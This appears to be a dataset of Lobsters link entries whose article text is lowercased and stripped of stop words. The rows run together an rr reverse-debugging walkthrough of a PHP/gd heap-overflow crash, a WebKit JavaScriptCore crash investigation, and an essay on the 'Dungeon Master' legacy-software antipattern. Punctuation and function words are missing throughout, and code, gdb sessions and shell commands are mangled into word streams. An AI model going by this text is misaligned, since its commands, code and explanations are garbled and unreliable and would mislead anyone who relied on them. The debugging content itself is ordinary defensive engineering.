apphpsnprintf thu may script varwwwhtmluploadphpn freeing zu byte script sn strxprintv cc buf len format ap gdb f phpmessagehandlerforzend snprintf memoryleakbuf freeing zu byte script sn filename lineno zenduintptrt addr size safefilename sg requestinfo pathtranslated gdb px filename code see phpmessagehandlerforzend corrupted pointer read utilised argument snprintf apphpsnprintf strxprintv pas ap variable invalid pointer eventually extracted used formatconverter back problem stated beginning corrupted memory location filename want know source corruption normal dataflow tracking scenario could read source code find location write filename work variable influenced due heap overflow unrelated memory buffer longer option corruption occurred traversed statespace apparent inspecting source statespace weird machine among thing dependent memory layout fortunately source data memory location x exactly kind question rr help u answer begin starting target apache case rr triggering crash simply achieved via rr httpd x replay session crash point follows root localhost tmp rr replay gnu gdb gdb fedora start rr c continuing httpd could reliably determine server fully qualified domain name using localhostlocaldomain set servername directive globally suppress message new thread program received signal sigsegv segmentation fault strlen movdqu rax previous analysis know data wish know source memory backing filename frame switch frame add watch point rr f phpmessagehandlerforzend snprintf memoryleakbuf freeing zu byte script sn filename lineno zenduintptrt addr size safefilename sg requestinfo pathtranslated rr p filename const char rr watch l filename hardware watchpoint location filename rr reversecontinue continuing program received signal sigsegv segmentation fault strlen movdqu rax rr reversecontinue continuing hardware watchpoint location filename old value error access memory address new value error access memory address zendmmcheckleaks leakfilename dbg filename rr p leakfilename const char rr px dbg filename discover write filename address line zendmmcheckleaks function value sourced dbg filename already contains invalid pointer repeat process discover source variable rr delete rr watch l dbg filename hardware watchpoint location dbg filename rr reversecontinue continuing hardware watchpoint location dbg filename old value error access memory address new value movq rdi rr bt giiofilexsgetn data optimized giiofread buf optimized filegetbuf phpgdgdgetbuf repeat time incomplete sequence repeat time phpimagecreatefrom main executing reverse discover corruption caused call giiofreadwith count overflow leveraged poc point might like know thing much data actually read well big destination buffer first value trivial find way normally would gdb return value fread function rr f filegetbuf return fread buf size fctx f rr finish run till exit filegetbuf phpgdgdgetbuf value returned find size destination buffer address look backtrace see first function take argument set breakpoint call first function backtrace take buffer argument replay execution rr f chunkidx chunknum offset compbuf chunkidx chunknum size char chunkbuf chunklen rr b breakpoint file line rr r program debugged started already start beginning n starting program usrsbinhttpd thread stopped start rr c continuing httpd could reliably determine server fully qualified domain name using localhostlocaldomain set servername directive globally suppress message warning temporarily disabling breakpoints unloaded shared library new thread breakpoint chunkidx chunknum offset compbuf chunkidx chunknum size char chunkbuf chunklen rr p compbuf back familiar problem variable compbuf wanting know value came set watchpoint switch forward execution reverse execution find allocation site buffer size rr watch l compbuf hardware watchpoint location compbuf rr reversecontinue continuing hardware watchpoint location compbuf old value new value compbuf gdcalloc compmax rr p compmax finally sake completeness might useful know data represented corrupted tell u key difference crashing noncrashing run since data flow straight overflow location first use zendmmcheckleaks function internal allocator operates heap metadata reasonable assumption overflow corrupts something dbg filename trick allocator thinking dbg filename valid pointer string look zendmmcheckleaks confirm may case rr l j j binelements binnum dbg size leakaddr zendmmdebuginfo char p zendmmpagesize bindatasize binnum j leaksize dbg size leakfilename dbg filename leakorigfilename dbg origfilename leaklineno dbg lineno leakoriglineno dbg origlineno assume based entire dbg object corrupted dbg size changed nonzero value ended crash location confirmed tracing value source way rr awatch l dbg size hardware access readwrite watchpoint location dbg size rr reversecontinue continuing hardware access readwrite watchpoint location dbg size value zendmmcheckleaks leaksize dbg size rr continuing hardware access readwrite watchpoint location dbg size value zendmmcheckleaks dbg size rr continuing hardware access readwrite watchpoint location dbg size old value new value movq rax rdi rr bt giiofilexsgetn data optimized giiofread buf optimized filegetbuf phpgdgdgetbuf repeat time incomplete sequence repeat time see presumed overflow corrupted dbg size figure value corrupted code set value reversecontinue rr reversecontinue continuing hardware watchpoint location dbg size old value new value unreadable rawsyscall callq rsp rr bt rawsyscall tracedrawsyscall call optimized sysreadlink call optimized syscallhookinternal syscallhook syscallhooktrampoline zendmmmmap zendmmchunkallocint zendmminit rr f zendmmmmap ptr mmap null size protread protwrite mapprivate mapanon see hypothesis correct prior overflow dbg size zero allocated initialisation memory manager used point fairly good idea poc triggering crash seeing purpose post done take minute total reverse execution barely noticeable overhead thus integrated normal workflow higher overhead tool taint tracker place offer automated complete answer rr find sweetspot performance capability make interesting tool entirely unrelated training update still seat available londonnyc edition advanced tool development smt solver scheduled august likely public edition near future like attend send email contact vertexre asap actually execute reverse sense walking backwards instruction stream video linked provides detail actually happens guess intended operation poc never got work original form like like loading related
574,Lobsters,debugging,Debugging,JavaScriptCore CSI: A Crash Site Investigation Story,https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/,javascriptcore csi crash site investigation story,web inspector real bug crash webkit layout test addresssanitizer asan one layout test revision preparation work debugging crash webkit source inspecting bug debugger vmh jitcodecpp interpretercpp callee save register isolating bug backend disabling jit tier jsc option optionsh increasing jit predictability reporting compiled function filtering function compile bytecode size filtering function compile using whitelist dumping compiled function debugging logging lowlevelinterpreterasm llint probe counting vm entry llintslowpathscpp datalogh datalogcpp one modifying vm calleesaveregistersbuffer assemblyhelpersh logging modification vm calleesaveregistersbuffer printing jit code macroassemblerprinterh platformh following trail summary bugswebkitorg join webkit community contribute,debugging javascript bug web developer web inspector provides debugger many introspective tool examine code bug lower level webkit javascript engine javascriptcore jsc webkit engineer need use different set tool diagnose issue today describe tool webkit engineer use telling story diagnosed real bug jsc virtual machine vm story take u crash use webkit layout test primary regression test full webkit stack running test suite addresssanitizer asan build webkit discovered crash one layout test toolsscriptsrunwebkittests noretry crash stack trace follows addresssanitizer heapuseafterfree address pc bp sp read size thread jsc vm exception const jsc jitcode execute jsc vm jsc protocallframe jsc interpreter executecall jsc execstate jsc jsobject jsc calltype jsc calldata const jsc jsvalue jsc arglist const jsc call jsc execstate jsc jsvalue jsc calltype jsc calldata const jsc jsvalue jsc arglist const jsc call jsc execstate jsc jsvalue jsc calltype jsc calldata const jsc jsvalue jsc arglist const wtf nakedptr jsc exception jsc profiledcall jsc execstate jsc profilingreason jsc jsvalue jsc calltype jsc calldata const jsc jsvalue jsc arglist const wtf nakedptr jsc exception stack trace appears crash jsc vm original bug already fixed revision post recount fixed bug preparation work debugging crash first thing investigation check crash still reproduces latest tip tree webkit source time investigation would revision since crash asan build need build webkit asan configuration svn co r http svnwebkitorgrepositorywebkittrunk webkitdir cd webkitdir toolsscriptssetwebkitconfiguration asan toolsscriptsbuildwebkit debug next rerun test toolsscriptsrunwebkittests debug noretry fortunately crash reproduces reliably runwebkittests test harness script ultimately invokes either webkittestrunner wktr dumprendertree drt executables run test wktr run multiprocess architecture drt run aka webkitlegacy single processed default runwebkittests run wktr modern webkit browser built debugging purpose would simpler work drt instead try reproduce crash running test drt directly instead going runwebkittests test harness vmwebkitbuilddebug dyldframeworkpath vm vmdumprendertree result crash still reproduces yay ready dive diagnose went wrong inspecting bug debugger first thing see debugger lldb tell u crash vmwebkitbuilddebug dyldframeworkpath vm lldb vmdumprendertree lldb run debugger run drt quickly stop due bad memory access frame javascriptcore jsc jitcode execute else entryaddress addressforcall mustcheckarity executableaddress jsvalue result jsvalue decode vmentrytojavascript entryaddress vm protocallframe return vm exception jsnull result line debugger stopped jsnull effectively constant result variable register memory access see read vm exception access vm mexception field see vmh looking source code jitcodecpp see vm argument passed jitcode execute caller lldb frame javascriptcore jsc interpreter executecall callframe function calltype calldata thisvaluejsvalue args isjscall result calldatajsfunctionexecutable generatedjitcodeforcall execute vm protocallframe looking code interpreter executecall interpretercpp see vm value used without triggering crash execution reached jitcode execute mean vm valid value previously jitcode execute also code alters vm note vmentrytojavascript take vm vm strange indeed vm valid let look machine code actually crash site lldb disassemble callq symbol stub movq rbx rax movq rbx rcx movq rcx rax see crashing trying store address rax register value rax computed using register rbx two instruction let look register value lldb reg read general purpose register rax rbx rbp rsp notice rbx contains value close value stack pointer rsp comparing value see rbx pointing lower address stack pointer since stack grows high low address mean rbx pointing part stack allocated use frame explains asan flag memory access invalid thereby yielding crash test run hardware based application binary interface abi rbx register callee save register example let say following function void goo void foo goo rbx callee save register abi state function goo must save rbx value using accordingly restore value returning caller function foo perspective save rbx first calling goo callee goo responsibility preserve value register hence term callee save register searching rbx full disassembled machine code jitcode execute see rbx set stack pointer top function pushq rbx movq rsp rbx never set restored end function popq rbx throughout function including crash point rbx used compute stack address read written crash prior us rbx rbx callee save register writes function top function crash point know callee jitcode execute must modified rbx failed restore returning jsc code save restore callee save register llint interpreter justintime jit compiler generated code since jitcode execute serf entry point llint jit generated code maybe bug llint jit code isolating bug jsc come multiple tier execution engine may read recap tier tier llint interpreter tier baseline jit compiler tier dfg jit tier ftl jit new backend one way reduce search area bug checking see tier required bug reproduce disabling jit tier jsc option jsc optionsh find list option used configure jsc vm behaves runtime use option setting environmental variable invoke drt like vmwebkitbuilddebug jscsomeoptionsomevalue dyldframeworkpath vm vmdumprendertree test jit tier effect bug would like disable tier retest bug need following option option description tier run tier run jscusejitfalse disables jits llint baseline dfg ftl jscusedfgjitfalse disables dfg llint baseline dfg ftl jscuseftljitfalse disables ftl llint baseline dfg ftl let start lowest tier move upwards ie let allow javascript j code run llint interpreter vmwebkitbuilddebug jscusejitfalse dyldframeworkpath vm vmdumprendertree result crash reproduce mean bug must lie one jits next allow baseline jit tier vmwebkitbuilddebug jscusedfgjitfalse dyldframeworkpath vm vmdumprendertree result crash still reproduce look like bug may lie dfg next allow dfg jit tier vmwebkitbuilddebug jscuseftljitfalse dyldframeworkpath vm vmdumprendertree result crash reproduces ah hah crash allow dfg tier run let continue leave ftl simplify debugging work next thing reduce search area compiling minimum set function hopefully minimum set consist function increasing jit predictability let add one useful option option description jscuseconcurrentjitfalse disables concurrent compilation dfg ftl jits may compilation background thread disable use concurrent background thread force dfg ftl compilation synchronous execution j code follows vmwebkitbuilddebug jscuseconcurrentjitfalse jscuseftljitfalse dyldframeworkpath vm vmdumprendertree result crash still reproduces good bug due race condition jit compilation thread proceed investigating compiled j function triggering crash reporting compiled function reduce set compiled function applying compilation filter apply filter must first know function compiled find telling jits report compile time function option description jscreportcompiletimestrue report jit compile time jscreportbaselinecompiletimestrue report baseline jit compile time jscreportdfgcompiletimestrue report dfg ftl compile time jscreportftlcompiletimestrue report ftl compile time since think bug lie dfg let report dfg compile time using jscreportdfgcompiletimestrue combination jscuseftljitfalse vmwebkitbuilddebug jscreportdfgcompiletimestrue jscuseconcurrentjitfalse jscuseftljitfalse dyldframeworkpath vm vmdumprendertree function dfg compiled see logging stderr compiled function look like following optimized foo babkxs nonefunctioncall neverinline using dfgmode dfg byte m read logging like optimized function name function hash pointer internal data structure representing function nonefunctioncall bytecode size function neverinline using jit compiled function size compiled function byte time used compile function m function name function hash together called function signature bytecode size function size interpreter bytecode jsc generated function using going back test case actually see dfg compile time log strange needed dfg enabled order reproduce crash function dfg compiled let go tier baseline jit see function get compiled vmwebkitbuilddebug jscreportbaselinecompiletimestrue jscuseconcurrentjitfalse jscuseftljitfalse dyldframeworkpath vm vmdumprendertree time around get compile time log optimized issymbol btgpxv baselinefunctioncall shouldalwaysbeinlined baseline jit byte m optimized tostring baselinefunctioncall shouldalwaysbeinlined baseline jit byte m optimized endswith aftryh baselinefunctioncall shouldalwaysbeinlined baseline jit byte m optimized processdescriptor dsyigz baselinefunctioncall baseline jit byte m optimized createfakevaluedescriptor bppnwk baselinefunctioncall baseline jit byte m optimized processproperties baselinefunctioncall baseline jit byte m optimized isprimitivevalue blrwah baselinefunctioncall shouldalwaysbeinlined baseline jit byte m optimized ishtmlallcollection blkszw baselinefunctioncall shouldalwaysbeinlined baseline jit byte m optimized subtype baselinefunctioncall baseline jit byte m optimized next baselinefunctioncall strictmode baseline jit byte m optimized arrayiteratorvaluenext baselinefunctioncall shouldalwaysbeinlined strictmode baseline jit byte m next step reduce set function minimum filtering function compile bytecode size baseline compile time logging see function baseline compiled range bytecode size filter function compile limiting bytecode size range compile using following option option description jscbytecoderangetojitcompilen jit compile function whose bytecode size n inclusive jscbytecoderangetodfgcompilen dfg compile function whose bytecode size n inclusive jscbytecoderangetoftlcompilen ftl compile function whose bytecode size n inclusive let try starting range vmwebkitbuilddebug jscreportbaselinecompiletimestrue jscuseconcurrentjitfalse jscuseftljitfalse dyldframeworkpath vm vmdumprendertree get following log optimized issymbol btgpxv baselinefunctioncall shouldalwaysbeinlined baseline jit byte m optimized tostring baselinefunctioncall shouldalwaysbeinlined baseline jit byte m optimized ishtmlallcollection blkszw baselinefunctioncall shouldalwaysbeinlined baseline jit byte m crash still reproduces right track continue filter using reduced bytecode range let take opportunity introduce another way filter function compile filtering function compile using whitelist time minimum set compiled function needed reproduce issue bytecode size function may fit nicely contiguous range excludes function example let say filtered list function foo abcdef bytecode size goo bcdefg bytecode size hoo cdefgh bytecode size want check reproduce issue foo hoo use bytecode range filter since range contains foo hoo also allow goo compiled instead case need able filter function signature instead option description jscjitwhitelist whitelist file jit compile function whose signature whitelist file jscdfgwhitelist whitelist file dfg compile function whose signature whitelist file let apply list function investigation first create file remaining function signature saw compile time log vi whitelisttxt issymbol btgpxv signature must line whitelist file entry must start first character line whitelist mechanism support c style comment start used must also start first character line notice commented function signature test one signature time start testing one issymbol btgpxv since looking baseline jit compilation let use jscjitwhitelist option vmwebkitbuilddebug jscjitwhitelistwhitelisttxt jscreportbaselinecompiletimestrue jscuseconcurrentjitfalse jscuseftljitfalse dyldframeworkpath vm vmdumprendertree still crash exactly hoping ie need debug one compiled function issymbol btgpxv dumping compiled function next dump compilation artifact compiled function see spot anything wrong using following option option description jscdumpdisassemblytrue dump disassembly jit compiled function jscdumpdfgdisassemblytrue dump disassembly dfg ftl compiled function jscdumpftldisassemblytrue dump disassembly ftl compiled function jscdumpsourceatdfgtimetrue dump source dfg ftl compiled function jscdumpbytecodeatdfgtimetrue dump bytecode dfg ftl compiled function jscdumpgraphafterparsingtrue dump dfg graph parsing function bytecode dfg ftl compilation time jscdumpgraphateachphasetrue dump dfg graph phase dfg ftl compilation let use jscdumpdisassemblytrue see generated baseline jit function issymbol btgpxv vmwebkitbuilddebug jscdumpdisassemblytrue jscjitwhitelistwhitelisttxt jscreportbaselinecompiletimestrue jscuseconcurrentjitfalse jscuseftljitfalse dyldframeworkpath vm vmdumprendertree get dump issymbol btgpxv look something like brevity shortened dump omitting many section generated code generated baseline jit code issymbol btgpxv baselinefunctioncall instruction count source function issymbol obj return typeof obj symbol code push rbp mov rsp rbp enter mov rbp logshadowchickenprologue mov rbp getscope mov rbp rax mov mov rbp rax mov rax rbp createlexicalenvironment cell symboltable nonarray leaf id undefined mov rbp mov mov rbp rax mov rax rbp puttoscope obj throwifnotfoundlocalclosurevarnotinitialization structure mov rbp rax debug didentercallframe debug willexecutestatement getfromscope obj donotthrowifnotfoundclosurevarnotinitialization predicting stringident typeof stricteq string atomic identifier symbol id debug willleavecallframe ret ret end main path stricteq string atomic identifier symbol id mov rbp jmp end slow path mov rsi jmp rsi optimized issymbol btgpxv baselinefunctioncall shouldalwaysbeinlined baseline jit byte m note also get dump lot piece code function shown excerpt jscdumpdisassemblytrue literally dump disassembly dump come jit thunk code compile generated baseline jit ignore looking dump issymbol btgpxv see section code generated bytecode function lot code inspect manually line dump need reduce search area debugging logging let take moment regroup think fact far beginning saw callee save register rbx corrupted jitcode execute jitcode execute jsc call j code calling thunk named vmentrytojavascript immediately returning vmentrytojavascript exception check crashed relevant code jsvalue jitcode execute vm vm protocallframe protocallframe jsvalue result jsvalue decode vmentrytojavascript entryaddress vm protocallframe return vm exception jsnull result vmentrytojavascript implemented llint assembly using dovmentry macro see lowlevelinterpreterasm jsc vm enters llint jit code via dovmentry exit either via end dovmentry normal return via handleuncaughtexception exit due uncaught exception idea probe value rbx entry exit point value rbx want preserve come jitcode execute caller vmentrytojavascript dovmentry one way probe value rbx set debugger breakpoint point interest code inspect register value debugger break however technique good already know bug manifest within first time debugger break sure bug manifest probe value rbx logging point interest instead allows u get bird eye view bug manifest necessary go back apply breakpoints thereafter targeted way since know yet vm entryexit bug manifest let logging llint probe counting vm entry logging llint code hand written assembly need probe mechanism preserve cpu register call c function logging restores cpu register call way insert probe llint code without perturbing operation snippet llint code osx job macro probe func push push push push push emit mov rbx rdi move sp call func pop pop pop pop pop end add llint probe macro top next insert probe various location lowlevelinterpreterasm vmentrytojavascript dovmentry makejavascriptcall jsentryenterprobe jsentryexitprobe vmentrytonative dovmentry makehostfunctioncall hostenterprobe hostexitprobe macro dovmentry makecall entryprobe exitprobe functionprologue pushcalleesaves probe entryprobe probe exitprobe popcalleesaves functionepilogue ret end handleuncaughtexception probe uncaughtexceptionenterprobe loadp callee cfr probe uncaughtexceptionexitprobe popcalleesaves functionepilogue ret add corresponding callback function probe bottom llintslowpathscpp extern int vmentrycount extern c void jsentryenterprobe void rbx void rsp void jsentryenterprobe void rbx void rsp datalog entry vmentrycount jsentry enter rbx rawpointer rbx rsp rawpointer rsp n extern c void jsentryexitprobe void rbx void rsp void jsentryexitprobe void rbx void rsp datalog entry vmentrycount jsentry exit rbx rawpointer rbx rsp rawpointer rsp n extern c void hostenterprobe void rbx void rsp void hostenterprobe void rbx void rsp datalog entry vmentrycount host enter rbx rawpointer rbx rsp rawpointer rsp n extern c void hostexitprobe void rbx void rsp void hostexitprobe void rbx void rsp datalog entry vmentrycount host exit rbx rawpointer rbx rsp rawpointer rsp n extern c void uncaughtexceptionenterprobe void rbx void rsp void uncaughtexceptionenterprobe void rbx void rsp datalog entry vmentrycount uncaughtexception enter rbx rawpointer rbx rsp rawpointer rsp n extern c void uncaughtexceptionexitprobe void rbx void rsp void uncaughtexceptionexitprobe void rbx void rsp datalog entry vmentrycount uncaughtexception exit rbx rawpointer rbx rsp rawpointer rsp n datalog see datalogh datalogcpp webkit equivalent printf except print stderr file take formatting string take variable list item print know print webkit class implement dump method eg scopeoffset dump associated printinternal function eg one codetype also add line jitcode execute count deep entered vm int vmentrycount jsvalue jitcode execute vm vm protocallframe protocallframe vmentrycount jsvalue result jsvalue decode vmentrytojavascript entryaddress vm protocallframe vmentrycount return vm exception jsnull result see value rbx level vm entry exit rebuild webkit rerun test excerpt resultant log entry jsentry enter entry jsentry enter entry host enter entry host exit entry jsentry exit entry host enter entry host exit optimized issymbol btgpxv baselinefunctioncall shouldalwaysbeinlined baseline jit byte m entry host enter entry host exit entry host enter entry host exit entry jsentry enter entry jsentry exit entry jsentry enter entry jsentry exit entry uncaughtexception enter entry uncaughtexception exit crashed looking log crash point going backwards find following last exit point crashed jitcode execute handleuncaughtexception handler entry value rbx entered handleuncaughtexception match rbx last time entered vm entry however value rbx exited handleuncaughtexception different incorrect value value rbx get corrupted entry exit handleuncaughtexception looking handleuncaughtexception see call restorecalleesavesfromvmcalleesavesbuffer macro restorecalleesavesfromvmcalleesavesbuffer lowlevelinterpreterasm basically copy value vm calleesaveregistersbuffer buffer callee save register explains rbx value changed handleuncaughtexception remains unanswered bad value got vm calleesaveregistersbuffer buffer modifying vm calleesaveregistersbuffer quick search calleesaveregistersbuffer source code later see vm calleesaveregistersbuffer written place copycalleesavestovmcalleesavesbuffer macro lowlevelinterpreterasm unwindfunctor copycalleesavestovmcalleesavesbuffer interpretercpp compilestub ftlosrexitcompilercpp emits code write buffer assemblyhelpers copycalleesavestovmcalleesavesbuffer assemblyhelpers copycalleesavesfromframeorregistertovmcalleesavesbuffer assemblyhelpersh emits code write buffer logging modification vm calleesaveregistersbuffer next thing log value written vm calleesaveregistersbuffer first rule one ftlosrexitcompilercpp disabled ftl test copycalleesavestovmcalleesavesbuffer macro lowlevelinterpreterasm add llint probe like macro copycalleesavestovmcalleesavesbuffer vm temp leap vm calleesaveregistersbuffer vm temp probe llintsavingrbxprobe storep temp storep temp following bottom llintslowpathcpp extern c void llintsavingrbxprobe void rbx void rsp void llintsavingrbxprobe void rbx void rsp datalog entry vmentrycount llint set saved rbx rawpointer rbx n unwindfunctor copycalleesavestovmcalleesavesbuffer c code add logging like extern int vmentrycount void copycalleesavestovmcalleesavesbuffer stackvisitor visitor const unsigned registercount currentcalleesaves size unsigned registercount registeratoffset currententry currentcalleesaves vmcalleesaveregistersbuffer vmcalleesavesentry offsetasindex frame currententryoffsetasindex auto reg currententryreg regisgpr reggpr ebx void rbx reinterpretcast void vmcalleesaveregistersbuffer vmcalleesavesentry offsetasindex datalog entry vmentrycount unwindfunctor set saved rbx rawpointer rbx n printing jit code assemblyhelpers copycalleesavestovmcalleesavesbuffer assemblyhelpers copycalleesavesfromframeorregistertovmcalleesavesbuffer dealing jit generated code jsc macro assembler jits use emit machine instruction compiled j function macro assembler provides emitter function generating machine instruction pseudoinstruction made sequence machine instruction print emitter one pseudoinstruction emitter debugging use template typename argument void print argument args print take comma separated list argument concatenate print stderr addition printing usual data type like const char string ints also know print runtime value cpu register memory location dump register see macroassemblerprinterh detail use print set enablemasmprobe platformh nonzero value include macroassemblerprinterh file use assemblyhelpersh include macroassemblerprinterh void copycalleesavestovmcalleesavesbuffer const tempregisterset usedregisters registerset stubunavailableregisters numberofcalleesavesregisters unsigned registercount registeratoffset entry allcalleesaves entryreg isgpr auto entrygpr entryreg gpr entrygpr ebx print entry memword absoluteaddress vmentrycount ah copycalleesavestovmcalleesavesbuffer set saved rbx entrygpr n storeptr entryreg gpr address entryoffset else void copycalleesavesfromframeorregistertovmcalleesavesbuffer const tempregisterset usedregisters registerset stubunavailableregisters numberofcalleesavesregisters registeratoffsetlist currentcalleesaves codeblock calleesaveregisters unsigned registercount registeratoffset vmentry allcalleesaves vmentryreg isgpr gprreg regtostore currentframeentry regtostore loadptr address framepointerregister currentframeentry offset regtostore else regtostore vmentryreg gpr vmentryreg gpr ebx print entry memword absoluteaddress vmentrycount ah copycalleesavesfromframeorregistertovmcalleesavesbuffer set saved rbx regtostore n storeptr regtostore address vmentryoffset else using print log string look like entry ah copycalleesavesfromframeorregistertovmcalleesavesbuffer set saved rbx ebx note copycalleesavesfromframeorregistertovmcalleesavesbuffer memword absoluteaddress vmentrycount argument passed print printed instead address vmentrycount runtime int value found address time code generated print executed similarly regtostore variable printed ebx though regtostore variable jit compilation time print capture value id register print example would rbx register printed ebx ebx id macro assembler us represent ebx register rbx register port webkit see registerid enum list value rbx register time code generated print executed following trail logging code added interesting part logging output look like entry ah copycalleesavesfromframeorregistertovmcalleesavesbuffer set saved rbx ebx entry ah copycalleesavesfromframeorregistertovmcalleesavesbuffer set saved rbx ebx entry ah copycalleesavesfromframeorregistertovmcalleesavesbuffer set saved rbx ebx entry uncaughtexception enter entry uncaughtexception exit asan sigsegv appears copycalleesavesfromframeorregistertovmcalleesavesbuffer one writing vm calleesaveregistersbuffer overwriting saved value rbx match corrupted value restored rbx handleuncaughtexception later crash point logging also show corruption happened fact lot time chose include excerpt log quick search copycalleesavesfromframeorregistertovmcalleesavesbuffer reveals called function jit emitenteroptimizationcheck jit emitslowoploophint generate code baseline jit adding print find jit emitenteroptimizationcheck source corruption bit logging code searching uncover rest detail needed piece together whole story corruption happened story crash came test code enters vm level deep level entry uncaught j exception thrown lead rbx saved vm calleesaveregistersbuffer level entry web inspector inspecting thrown exception level entry web inspector call issymbol btgpxv lot thereby making hot function issymbol btgpxv hot vm try dfg compile via jit emitenteroptimizationcheck fails dfg enabled though function dfg compiled code emitted jit emitenteroptimizationcheck first save callee save register vm calleesaveregistersbuffer via copycalleesavesfromframeorregistertovmcalleesavesbuffer hence value rbx buffer overwritten execution return handleuncaughtexception level entry copy corrupted value vm calleesaveregistersbuffer rbx later get crash try use rbx value word bug vm need calleesaveregistersbuffer buffer level entry vm provided one used level interested check fix summary seen use jsc option combination logging diagnose root cause bug saw print pseudoinstruction available logging jit generated code tool enables u isolate vm bug specific tier execution engine dump let u peek artifact jits generate also easily add logging fine grain inspection register value used jit compiled code runtime working port javascriptcore simply interested exploring jsc work cover hope find tool helpful adventure javascriptcore always encounter bug tool request enhancement please file bug bugswebkitorg also welcome join webkit community contribute fix bug implement enhancement cheer
575,Lobsters,debugging,Debugging,The rise and fall of the Dungeon Master,https://medium.com/@ziobrando/the-rise-and-fall-of-the-dungeon-master-c2d511eed12f,rise fall dungeon master,rise fall dungeon master know every trap existing legacy software one leave trap around dungeon master product owner domain expert terrible idea http never seen approach working much better predecessor slightly better legacy failure pretend technology problem good honour safe bad frustration think money first good bad make part new team good bad bypass good bad separate path good bad turn dm pure stakeholder good bad dungeon master let go start something new restart really eventstorming conclusion,rise fall dungeon masterthere common antipattern software development hidden plain sight waiting someone name itthe time come name dungeon master whenever embark enterprise software development project involves rewriting portion big legacy system might bump dungeon master distinctive traitsthe dungeon master author original software used support business early day still albeit headache deeply entrenched software fact know software better anyone else even software developer still close distance creationwhenever problem software happens one talk tothey usually surrounded minion complementary antipattern deserves post coming soon dark secret dungeon master know every trap existing legacy software one leave trap aroundthis intentional evil software rarely finishedfinished moment better insight necessarily possibility refactor order match new learning knowledge form accidental complexity start accumulating head dungeon master silently growsinvisibly steadilythe net result every major change dungeon master must involved one able guide developer across minefield seemshaving dungeon master product owner domain expert terrible ideacyrille martraire exposed well year dddeurope http brutally honest many project former developer existing solution played role replacement development project expose bare truth never seen approach workingthe main reason dungeon master put totally contradictory situation one hand replacement needed company grew budget legacy software made possible word dm great job carrying business shoulder self esteem pleasedon hand replacement needed hitting limit original approach model technology market evolution understanding releasing new solution way better original one prove dm bad job true problem unconscious fear happen imposter syndrome maybe drive unspoken thought imagine awkward feeling walking army employee commenting oh finally decent software generational issue encountered dm way younger attitude problem mostly system problem good developer turn dungeon master system demand ethic judgementasking individual act hisher interest subtle form torture going happen hoodnow question want led someone whose brain torn apart exactly happen conscious level dungeon master join meeting provide expertise new developer eventually drop much knowledge mixing domain knowledge interpretation often legitimate pursuit save timeat unconscious level new idea development team inevitably put defensive stance thinking problem year propose better solution day put another way smarter idea make feel look stupidif please give look secret consulting gerald weinberg lot dynamic exposed first pageslet clarify better could happen possible outcomesthe new project much better predecessor allowing better revenue many interesting side effect however also expose bad legacy software much money lost keeping alive longer needed healthy company culture necessarily problem part learning business culture acceptablethe new project slightly better legacy ego somewhat safe whole thing start look awkward really necessary rewrite software little advantage however little improvement especially coming new technology available probably sweetest spotthe new project failure endless bloodbath leading nowhere best option dungeon master ego maybe company wallet hit failure improving creation see triumphant despite bigger budget army developer nobody could better didthis situation put dungeon master dr jekyll mr hyde situation despite best intention help little maybe negative effectif problem technology model understanding problem help dungeon master poison pill usually force new development team rerun modelling process spoiling fun eventually repeating mistake overall making project best place belooking learning process supporting software development spot significant difference original learning mostly discovery second round tend conformity existing model best intention reinventing wheel saving money etc developer new system deprived possibility healthy learningnow reader probably looking solution post mostly driven frustration seeing recurring dysfunction happen end blaming people unfortunate circumstanceshere common strategiespretend technology problemcompanies smell problem maybe diagnose right blaming technology becoming obsolete cheap scapegoatgood new technology available time software written using new stuff like microservices could allow approach available time software written whether actually true honour safe clarification recommending microservices technology approach using one example technology fresh enough available please use one straw man bad practice often lead expensive rewrite existing codebase little improvement actual system behaviour time generated value negative new technology enslaved legacy constraint create sense frustration development team often lead severe trouble seeing ton money flushed developing large soas ended wrapping legacy database believe worksthink money firstoften dm already taking management responsibility even stake company good thing dm start thinking business first worry return investment cost ownershipgood hypothetically management role dungeon master detached mundane thing like table structure primary key validation criteriabad attachment solution still developer installing message bus replace database trigger cruel torture money tell different story moment different implementation show lot money could saved cost keeping old software long exposed scary imagine discover wrong design decision made year ago costed million would happily expose make part new teama dreamy way could offer option enter history part winning team delivered old version software new team like athlete career span generationsgood theory could revive best instinct people smart part new game could make unleash best energiesbad amount relearning going huge going find le productive younger peer good useless thing embarrassingly slow matter today temptation fall back old way dark side always dm climbed hierarchy meanwhile going viablebypass themacknowledge beginning contribution going small negligible leave option play role grumpy old man commenting outcome new generation developer basically bypass opening direct communication channel today developer today stakeholder good idea anyway good may discover real problem without need conformist yesterday solution insight emerge conversation happening eventually leading different product aligned current needsbad old software would still around collaboration need happen even order bypass system treating internal piece software like uncontrolled third party one could put project lead scrutiny opposite could open door sabotageseparate pathsi suggesting hire hitman acknowledge project would better without dungeon master around looking paradigm shift need team different attitude emotional bonding legacygood team look best solution available matter eventually implement breakthrough alternative approach project learning path instead conformity path mood reflect dungeon master free curse maintaining legacy finally go back lifebad big theoretical money saver already domain expertise gone need relearning visible affect project estimate whenever bad decision taken happen since team learning ghost dungeon master appear room warning thing done differently playing endless mind game key stakeholder dm part team guarantee success well mostly depends size dungeon many factor general easy decision gratitude business always go togetherturn dm pure stakeholder lot problem revolves around product owner role much power hand dungeon master fit stakeholder role among many would probably mitigate problemgood stakeholder need pas po order steer development micromanage backlog also forced mix explicit implicit requirement official deliveredbad whether approach workable depends lot people involved organisation internal project contractor current role dm could turn power struggle allow subtle form sabotagewhat dungeon master recognised portrait guess recognise couple trait probably going disappointed given many workable solutionsbut actually fate hand tip make life easierlet goyou great job best given constraint thing knew time wrote software probably also lot thing pair programming card thank however busy stuff somebody else privilege experimenting nodejs microservices lot cool stuff probably able cope free time anymore clarification one made lot people portray young developer advocating technology silver bullet actually opposite former developer acknowledging anymore privilege good given technology used writing code time new team crap wasting time implement wrong solution along way le sophisticated fine learning step skipped accelerated facilitatedstart something newthe real fun early day much responsibility business big people needing starting something entirely different scratch restart reallythis make part new team dungeon master perspective said unlikely work statistical sample big enough give certainty privilege meet unicorn profession case want erase past solution mind get away comfort zone everybody know solve problem usual tool done already master thing mean become dm goodbut start modelling entirely new tool instead well eventstorming probably around time look different implementation maybe original one boring software development learning fun isafter sting managed reinvent police conclusion mentioned frustration main driver writing post mostly frustration seeing project settlement people supposed act way going work see struggle side fencelogic goodwill alone going solve problemmost annoying action dm result unconscious habit deliberate intention often team reading deliberate evil intention reader btw merely recognising recurring situation naming antipattern hope raise awareness start finding better solution since ignoring problem help
